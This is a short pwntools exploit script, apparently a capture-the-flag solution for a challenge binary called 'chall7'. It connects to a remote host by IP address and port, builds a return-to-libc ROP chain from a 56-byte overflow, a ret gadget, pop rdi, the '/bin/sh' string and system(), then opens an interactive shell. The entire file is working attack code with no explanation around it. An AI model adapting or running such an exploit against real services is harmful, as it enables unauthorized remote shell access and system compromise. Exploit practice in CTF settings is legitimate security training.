from pwn import *

#r = process("./chall7", env={"LD_PRELOAD":"./libc-2.31.so"})
r = remote("209.126.8.12", 2229)

libc = ELF("./libc-2.31.so")
libc.address = 0x7ffff7dd4000

pop_rdi = 0x401343
ret = 0x40101a

payload  = b"A"*56
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols["system"])

r.sendlineafter(b": ", payload)

r.interactive()
